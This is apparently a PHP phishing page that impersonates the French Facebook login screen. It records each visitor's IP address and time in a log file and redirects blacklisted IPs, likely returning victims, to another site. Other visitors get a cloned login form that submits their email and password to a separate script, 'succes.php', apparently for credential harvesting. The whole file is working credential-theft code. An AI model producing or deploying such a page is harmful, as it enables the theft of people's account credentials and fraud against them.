<?php
    $logs = 'Panel/logs.txt';
    setlocale(LC_TIME, 'fra_fra');
    error_reporting(-0);
    $date = strftime('%Y-%m-%d'); 
    $heure = strftime('%H:%M:%S'); 
    $redirection = file_get_contents('Panel/redirection.txt');
    $ip = $_SERVER['REMOTE_ADDR'];
    define('FICHIER', 'Panel/blacklist.txt');
    $existe = FALSE;
    $fp = fopen(FICHIER, 'r');
    while (!feof($fp) && !$existe) {
        $ligne = fgets($fp, 1024);
        if (preg_match('|\b' . preg_quote($ip) . '\b|i', $ligne)) {
            $existe = TRUE;
        }
    }
    fclose($fp);
    if ($existe) {
        $message_log = "Une personne ayant pour IP '". $ip. "' est revenu sur le site le ". $date. " à ". $heure. ". Il as donc été redirigé vers le site suivant: ". $redirection. "\n";
        file_put_contents($logs, $message_log, FILE_APPEND | LOCK_EX); 
        header('Location:'. $redirection); 
    } else {
        $messag_log_refresh = "Une personne ayant pour IP '". $ip. "' est venu sur le site le ". $date. " à ". $heure. "\n";
        file_put_contents($logs, $messag_log_refresh, FILE_APPEND | LOCK_EX); 
        echo '
<html>
    <head>
        <title>Facebook - Connexion ou inscription</title>    
        <link rel="stylesheet" href="css/style.css">
        <meta charset="UTF-8">
    </head>
    <body>
        <div id="container">
            <div id="left">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook">
                <h1>Avec Facebook, partagez et restez en contact avec votre entourage.</h1><br>
                <h1></h1>
            </div>
            <div id="right">
                <form method="post" action="succes.php">
                    <input type="email" name="email" placeholder="Adresse email ou numéro de tél." required><br><br>
                    <input type="password" name="password" placeholder="Mot de passe" required><br><br>
                    <input type="submit" value="Se connecter"><br><br>
                    <a id="mdp-oublié" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMzMzA0NDU3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login">Mot de passe oublié ?</a>
                    <div id="separation"></div>
                    <a id="register" href="https://www.facebook.com/">Créer un nouveau compte</a>
                </form><br>
                <p><a id="entreprise" href="https://www.facebook.com/pages/create/?ref_type=registration_form">Créer une Page</a> pour une célébrité, un groupe ou une entreprise.</p>
            </div>
        </div>
    </body>
</html>
    ';}
?>